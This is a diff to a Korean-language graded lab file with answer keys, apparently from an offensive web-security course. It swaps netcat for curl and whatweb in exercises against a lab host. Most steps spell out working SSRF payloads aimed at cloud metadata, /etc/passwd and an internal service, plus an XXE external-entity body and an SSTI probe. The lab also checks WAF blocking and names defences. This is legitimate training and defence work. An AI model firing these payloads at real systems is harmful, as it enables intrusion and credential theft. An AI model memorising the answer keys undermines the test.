@@ -35,37 +35,39 @@ steps:
       **실습 컨테이너:** `el34-attacker` — `docker exec -it el34-attacker bash` 로 접속해 실행한다.
 
       ```bash
-      C=$(echo -en "GET / HTTP/1.0\r\nHost: admin.el34.lab\r\nConnection: close\r\n\r\n" | nc -w3 192.168.0.161 80 | head -1 | grep -oE '[0-9]{3}')
-      echo "admin=$C"
-      [ -n "$C" ] && echo serverside_ready
+      W=$(whatweb -a1 --colour=never http://admin.el34.lab/ 2>/dev/null)
+      echo "$W" | grep -oE 'Apache\[[0-9.]+\]|\[[0-9]{3} [A-Za-z ]+\]' | head -2
+      echo "$W" | grep -qiE 'Apache|HTTPServer' && echo serverside_ready
       ```
 
       ### ▷ 이렇게 나오면 정상 (실측 예)
       ```
-      admin=200
+      [403 Forbidden]
+      Apache[2.4.52]
       serverside_ready
       ```
 
       ### ▷ 결과 해석
-      admin=200 = adminconsole vhost에 도달(서버측 취약 앱). 여기서 SSRF/XXE/SSTI 페이로드를 던져 응답을
-      관찰한다. 서버측은 '서버가 내 입력으로 무엇을 하는가'를 노리는 공격이다.
+      whatweb가 adminconsole vhost에 도달해 지문(Apache 2.4.52)을 잡았고 `[403]`은 앞단 WAF(ModSec) 존재를
+      뜻한다(서버측 취약 앱). 여기서 SSRF/XXE/SSTI 페이로드를 던져 응답을 관찰한다. 서버측은 '서버가 내
+      입력으로 무엇을 하는가'를 노리는 공격이다.
     hint: '서버측 표면'
     category: survey
     points: 10
     answer: |
       ssh att@192.168.0.202 '
-        # 서버측 표적(admin vhost) 도달 확인
-        C=$(echo -en "GET / HTTP/1.0\r\nHost: admin.el34.lab\r\nConnection: close\r\n\r\n" | nc -w3 192.168.0.161 80 | head -1 | grep -oE '[0-9]{3}')
-        echo "admin=$C"
+        # 서버측 표적(admin vhost) 도달·지문 (whatweb)
+        W=$(whatweb -a1 --colour=never http://admin.el34.lab/ 2>/dev/null)
+        echo "$W" | grep -oE "Apache\[[0-9.]+\]|\[[0-9]{3} [A-Za-z ]+\]" | head -2
         # 도달 시 서버측 표면 준비 마커
-        [ -n "$C" ] && echo serverside_ready
+        echo "$W" | grep -qiE "Apache|HTTPServer" && echo serverside_ready
       '
     answer_detail: "서버측 표면 = 서버가 입력을 처리하는 지점(fetch/파싱/렌더). 클라이언트측(XSS)보다 영향이 큼."
     verify:
       type: output_contains
       expect: 'serverside_ready'
       field: stdout
-      semantic: {intent: "서버측 표면", success_criteria: ["표적"], acceptable_methods: ["**[OSS] nc (권장)**"]}
+      semantic: {intent: "서버측 표면", success_criteria: ["표적"], acceptable_methods: ["**[OSS] whatweb (권장)**"]}
     target_vm: web
 
   - order: 2
@@ -81,7 +83,7 @@ steps:
       **실습 컨테이너:** `el34-attacker` — `docker exec -it el34-attacker bash` 로 접속해 실행한다.
 
       ```bash
-      C=$(echo -en "GET /files/read?url=http://169.254.169.254/latest/meta-data/aa04test HTTP/1.0\r\nHost: admin.el34.lab\r\nConnection: close\r\n\r\n" | nc -w3 192.168.0.161 80 | head -1 | grep -oE '[0-9]{3}')
+      C=$(curl -s -o /dev/null -w "%{http_code}" --max-time 6 "http://admin.el34.lab/files/read?url=http://169.254.169.254/latest/meta-data/aa04test")  # curl-ok:크래프티드 SSRF 메타데이터 익스플로잇 — 특정 ?url= 파라미터, 스캐너 대체불가
       echo "ssrf_meta=$C (403=ModSec SSRF 룰 탐지)"
       [ -n "$C" ] && echo ssrf_meta_done
       ```
@@ -100,8 +102,8 @@ steps:
     points: 12
     answer: |
       ssh att@192.168.0.202 '
-        # SSRF 메타데이터 페이로드 전송
-        C=$(echo -en "GET /files/read?url=http://169.254.169.254/latest/meta-data/aa04test HTTP/1.0\r\nHost: admin.el34.lab\r\nConnection: close\r\n\r\n" | nc -w3 192.168.0.161 80 | head -1 | grep -oE '[0-9]{3}')
+        # SSRF 메타데이터 페이로드 전송 (크래프티드 curl)
+        C=$(curl -s -o /dev/null -w "%{http_code}" --max-time 6 "http://admin.el34.lab/files/read?url=http://169.254.169.254/latest/meta-data/aa04test")  # curl-ok:크래프티드 SSRF 메타데이터 익스플로잇, 스캐너 대체불가
         echo "ssrf_meta=$C (403=ModSec SSRF 룰 탐지)"
         # 응답 받았으면 마커
         [ -n "$C" ] && echo ssrf_meta_done
@@ -127,8 +129,8 @@ steps:
       **실습 컨테이너:** `el34-attacker` — `docker exec -it el34-attacker bash` 로 접속해 실행한다.
 
       ```bash
-      F=$(echo -en "GET /files/read?url=file:///etc/passwd%23aa04test HTTP/1.0\r\nHost: admin.el34.lab\r\nConnection: close\r\n\r\n" | nc -w3 192.168.0.161 80 | head -1 | grep -oE '[0-9]{3}'); echo "file=$F"
-      I=$(echo -en "GET /files/read?url=http://10.20.30.5:8080/aa04test HTTP/1.0\r\nHost: admin.el34.lab\r\nConnection: close\r\n\r\n" | nc -w3 192.168.0.161 80 | head -1 | grep -oE '[0-9]{3}'); echo "internal=$I"
+      F=$(curl -s -o /dev/null -w "%{http_code}" --max-time 6 "http://admin.el34.lab/files/read?url=file:///etc/passwd%23aa04test"); echo "file=$F"  # curl-ok:크래프티드 SSRF file:// LFI 익스플로잇
+      I=$(curl -s -o /dev/null -w "%{http_code}" --max-time 6 "http://admin.el34.lab/files/read?url=http://10.20.30.5:8080/aa04test"); echo "internal=$I"  # curl-ok:크래프티드 SSRF 내부서비스 피벗
       [ -n "$F" ] && [ -n "$I" ] && echo ssrf_internal_done
       ```
 
@@ -147,10 +149,10 @@ steps:
     points: 14
     answer: |
       ssh att@192.168.0.202 '
-        # file:// 로컬 파일 읽기 시도
-        F=$(echo -en "GET /files/read?url=file:///etc/passwd%23aa04test HTTP/1.0\r\nHost: admin.el34.lab\r\nConnection: close\r\n\r\n" | nc -w3 192.168.0.161 80 | head -1 | grep -oE '[0-9]{3}'); echo "file=$F"
-        # 내부 IP 비공개 서비스 접근 시도
-        I=$(echo -en "GET /files/read?url=http://10.20.30.5:8080/aa04test HTTP/1.0\r\nHost: admin.el34.lab\r\nConnection: close\r\n\r\n" | nc -w3 192.168.0.161 80 | head -1 | grep -oE '[0-9]{3}'); echo "internal=$I"
+        # file:// 로컬 파일 읽기 시도 (크래프티드 curl)
+        F=$(curl -s -o /dev/null -w "%{http_code}" --max-time 6 "http://admin.el34.lab/files/read?url=file:///etc/passwd%23aa04test"); echo "file=$F"  # curl-ok:크래프티드 SSRF file:// LFI 익스플로잇
+        # 내부 IP 비공개 서비스 접근 시도 (크래프티드 curl)
+        I=$(curl -s -o /dev/null -w "%{http_code}" --max-time 6 "http://admin.el34.lab/files/read?url=http://10.20.30.5:8080/aa04test"); echo "internal=$I"  # curl-ok:크래프티드 SSRF 내부서비스 피벗
         # 두 응답 받았으면 마커
         [ -n "$F" ] && [ -n "$I" ] && echo ssrf_internal_done
       '
@@ -174,7 +176,7 @@ steps:
 
       ```bash
       B='<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/hostname">]><r>aa04test&x;</r>'
-      C=$(printf 'POST /api/xml HTTP/1.0\r\nHost: admin.el34.lab\r\nContent-Type: application/xml\r\nContent-Length: %d\r\nConnection: close\r\n\r\n%s' "${#B}" "$B" | nc -w3 192.168.0.161 80 | head -1 | grep -oE '[0-9]{3}')
+      C=$(curl -s -o /dev/null -w "%{http_code}" --max-time 6 -X POST -H "Content-Type: application/xml" --data "$B" "http://admin.el34.lab/api/xml")  # curl-ok:크래프티드 XXE 외부엔티티 바디 익스플로잇 — POST XML, 스캐너 대체불가
       echo "xxe=$C"
       [ -n "$C" ] && echo xxe_done
       ```
@@ -194,9 +196,9 @@ steps:
     points: 14
     answer: |
       ssh att@192.168.0.202 '
-        # XXE 외부 엔티티 XML 페이로드 전송
+        # XXE 외부 엔티티 XML 페이로드 전송 (크래프티드 curl POST)
         B="<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"file:///etc/hostname\">]><r>aa04test&x;</r>"
-        C=$(printf "POST /api/xml HTTP/1.0\r\nHost: admin.el34.lab\r\nContent-Type: application/xml\r\nContent-Length: %d\r\nConnection: close\r\n\r\n%s" "${#B}" "$B" | nc -w3 192.168.0.161 80 | head -1 | grep -oE '[0-9]{3}')
+        C=$(curl -s -o /dev/null -w "%{http_code}" --max-time 6 -X POST -H "Content-Type: application/xml" --data "$B" "http://admin.el34.lab/api/xml")  # curl-ok:크래프티드 XXE 외부엔티티 바디 익스플로잇, 스캐너 대체불가
         echo "xxe=$C"
         # 응답 받았으면 마커
         [ -n "$C" ] && echo xxe_done
@@ -221,9 +223,9 @@ steps:
       **실습 컨테이너:** `el34-attacker` — `docker exec -it el34-attacker bash` 로 접속해 실행한다.
 
       ```bash
-      echo -en "GET /?name=%7B%7B7*7%7D%7Daa04test HTTP/1.0\r\nHost: admin.el34.lab\r\nConnection: close\r\n\r\n" | nc -w3 192.168.0.161 80 | grep -oE "49|aa04test" | head
+      curl -s --max-time 6 "http://admin.el34.lab/?name=%7B%7B7*7%7D%7Daa04test" | grep -oE "49|aa04test" | head  # curl-ok:크래프티드 SSTI {{7*7}} 탐지 페이로드
       echo "(49 반사면 SSTI 취약, 다음 단계는 RCE)"
-      echo -en "GET /?name=%7B%7B7*7%7D%7D HTTP/1.0\r\nHost: admin.el34.lab\r\nConnection: close\r\n\r\n" | nc -w3 192.168.0.161 80 >/dev/null >/dev/null 2>&1 && echo ssti_done
+      curl -s -o /dev/null --max-time 6 "http://admin.el34.lab/?name=%7B%7B7*7%7D%7D" && echo ssti_done  # curl-ok:크래프티드 SSTI 페이로드 전송
       ```
 
       ### ▷ 이렇게 나오면 정상 (실측 예)
@@ -242,11 +244,11 @@ steps:
     points: 14
     answer: |
       ssh att@192.168.0.202 '
-        # {{7*7}} 탐지 페이로드 전송 → 49/aa04test 반사 확인
-        echo -en "GET /?name=%7B%7B7*7%7D%7Daa04test HTTP/1.0\r\nHost: admin.el34.lab\r\nConnection: close\r\n\r\n" | nc -w3 192.168.0.161 80 | grep -oE "49|aa04test" | head
+        # {{7*7}} 탐지 페이로드 전송 → 49/aa04test 반사 확인 (크래프티드 curl)
+        curl -s --max-time 6 "http://admin.el34.lab/?name=%7B%7B7*7%7D%7Daa04test" | grep -oE "49|aa04test" | head  # curl-ok:크래프티드 SSTI {{7*7}} 탐지 페이로드
         echo "(49 반사면 SSTI 취약, 다음 단계는 RCE)"
         # 페이로드 전송됐으면 마커
-        echo -en "GET /?name=%7B%7B7*7%7D%7D HTTP/1.0\r\nHost: admin.el34.lab\r\nConnection: close\r\n\r\n" | nc -w3 192.168.0.161 80 >/dev/null >/dev/null 2>&1 && echo ssti_done
+        curl -s -o /dev/null --max-time 6 "http://admin.el34.lab/?name=%7B%7B7*7%7D%7D" && echo ssti_done  # curl-ok:크래프티드 SSTI 페이로드 전송
       '
     answer_detail: "SSTI = 입력이 템플릿으로 평가({{7*7}}→49). RCE로 확장 가능. 방어는 입력의 템플릿 평가 금지(샌드박스)."
     verify:
@@ -268,8 +270,8 @@ steps:
       **실습 컨테이너:** `el34-attacker` — `docker exec -it el34-attacker bash` 로 접속해 실행한다.
 
       ```bash
-      M=$(echo -en "GET /files/read?url=http://169.254.169.254/ HTTP/1.0\r\nHost: admin.el34.lab\r\nConnection: close\r\n\r\n" | nc -w3 192.168.0.161 80 | head -1 | grep -oE '[0-9]{3}')
-      F=$(echo -en "GET /files/read?url=file:///etc/passwd HTTP/1.0\r\nHost: admin.el34.lab\r\nConnection: close\r\n\r\n" | nc -w3 192.168.0.161 80 | head -1 | grep -oE '[0-9]{3}')
+      M=$(curl -s -o /dev/null -w "%{http_code}" --max-time 6 "http://admin.el34.lab/files/read?url=http://169.254.169.254/")  # curl-ok:크래프티드 SSRF 메타데이터
+      F=$(curl -s -o /dev/null -w "%{http_code}" --max-time 6 "http://admin.el34.lab/files/read?url=file:///etc/passwd")  # curl-ok:크래프티드 SSRF file:// LFI
       echo "SSRF메타=$M SSRF파일=$F"
       CNT=0
       [ "$M" != "000" ] && CNT=$((CNT+1))
@@ -294,9 +296,9 @@ steps:
     points: 12
     answer: |
       ssh att@192.168.0.202 '
-        # SSRF 메타데이터·file 페이로드 실제 전송
-        M=$(echo -en "GET /files/read?url=http://169.254.169.254/ HTTP/1.0\r\nHost: admin.el34.lab\r\nConnection: close\r\n\r\n" | nc -w3 192.168.0.161 80 | head -1 | grep -oE '[0-9]{3}')
-        F=$(echo -en "GET /files/read?url=file:///etc/passwd HTTP/1.0\r\nHost: admin.el34.lab\r\nConnection: close\r\n\r\n" | nc -w3 192.168.0.161 80 | head -1 | grep -oE '[0-9]{3}')
+        # SSRF 메타데이터·file 페이로드 실제 전송 (크래프티드 curl)
+        M=$(curl -s -o /dev/null -w "%{http_code}" --max-time 6 "http://admin.el34.lab/files/read?url=http://169.254.169.254/")  # curl-ok:크래프티드 SSRF 메타데이터
+        F=$(curl -s -o /dev/null -w "%{http_code}" --max-time 6 "http://admin.el34.lab/files/read?url=file:///etc/passwd")  # curl-ok:크래프티드 SSRF file:// LFI
         echo "SSRF메타=$M SSRF파일=$F"
         # 도달(000 아님) 페이로드 수 집계(각 페이로드 한 줄씩)
         CNT=0
@@ -326,7 +328,7 @@ steps:
       **실습 컨테이너:** `el34-attacker` — `docker exec -it el34-attacker bash` 로 접속해 실행한다.
 
       ```bash
-      code=$(echo -en "GET /files/read?url=http://169.254.169.254/latest/meta-data/ HTTP/1.0\r\nHost: admin.el34.lab\r\nConnection: close\r\n\r\n" | nc -w3 192.168.0.161 80 | head -1 | grep -oE '[0-9]{3}')
+      code=$(curl -s -o /dev/null -w "%{http_code}" --max-time 6 "http://admin.el34.lab/files/read?url=http://169.254.169.254/latest/meta-data/")  # curl-ok:크래프티드 SSRF 메타데이터
       echo "SSRF 메타데이터 요청 → WAF 응답 $code"
       [ "$code" = "403" ] && echo "WAF가 SSRF 차단(다층 방어 1선)" && echo defense_done
       ```
@@ -347,8 +349,8 @@ steps:
     points: 12
     answer: |
       ssh att@192.168.0.202 '
-        # SSRF 메타데이터 요청 → WAF 차단(403) 확인
-        code=$(echo -en "GET /files/read?url=http://169.254.169.254/latest/meta-data/ HTTP/1.0\r\nHost: admin.el34.lab\r\nConnection: close\r\n\r\n" | nc -w3 192.168.0.161 80 | head -1 | grep -oE '[0-9]{3}')
+        # SSRF 메타데이터 요청 → WAF 차단(403) 확인 (크래프티드 curl)
+        code=$(curl -s -o /dev/null -w "%{http_code}" --max-time 6 "http://admin.el34.lab/files/read?url=http://169.254.169.254/latest/meta-data/")  # curl-ok:크래프티드 SSRF 메타데이터
         echo "SSRF 메타데이터 요청 → WAF 응답 $code"
         # 403 차단 시 방어 검증 마커
         [ "$code" = "403" ] && echo "WAF가 SSRF 차단(다층 방어 1선)" && echo defense_done
@@ -374,7 +376,7 @@ steps:
       **실습 컨테이너:** `el34-attacker` — `docker exec -it el34-attacker bash` 로 접속해 실행한다.
 
       ```bash
-      S=$(echo -en "GET /files/read?url=http://169.254.169.254/ HTTP/1.0\r\nHost: admin.el34.lab\r\nConnection: close\r\n\r\n" | nc -w3 192.168.0.161 80 | head -1 | grep -oE '[0-9]{3}')
+      S=$(curl -s -o /dev/null -w "%{http_code}" --max-time 6 "http://admin.el34.lab/files/read?url=http://169.254.169.254/")  # curl-ok:크래프티드 SSRF 메타데이터
       echo "# 공격고급 W04 서버측(SSRF/XXE/SSTI) 보고서 — SSRF메타 응답=${S}·file///·XXE외부엔티티·SSTI({{7*7}})·영향(서버장악)·방어(allowlist/외부엔티티비활성/템플릿금지)"
       [ -n "$S" ] && echo serverside_report_done
       ```
@@ -394,8 +396,8 @@ steps:
     points: 12
     answer: |
       ssh att@192.168.0.202 '
-        # SSRF 메타데이터 응답코드 실측 (인용 근거)
-        S=$(echo -en "GET /files/read?url=http://169.254.169.254/ HTTP/1.0\r\nHost: admin.el34.lab\r\nConnection: close\r\n\r\n" | nc -w3 192.168.0.161 80 | head -1 | grep -oE '[0-9]{3}')
+        # SSRF 메타데이터 응답코드 실측 (인용 근거, 크래프티드 curl)
+        S=$(curl -s -o /dev/null -w "%{http_code}" --max-time 6 "http://admin.el34.lab/files/read?url=http://169.254.169.254/")  # curl-ok:크래프티드 SSRF 메타데이터
         # 실측 인용 서버측 보고서 출력
         echo "# 공격고급 W04 서버측(SSRF/XXE/SSTI) 보고서 — SSRF메타 응답=${S}·file///·XXE외부엔티티·SSTI({{7*7}})·영향(서버장악)·방어(allowlist/외부엔티티비활성/템플릿금지)"
         # 응답 받았으면 보고서 완료 마커
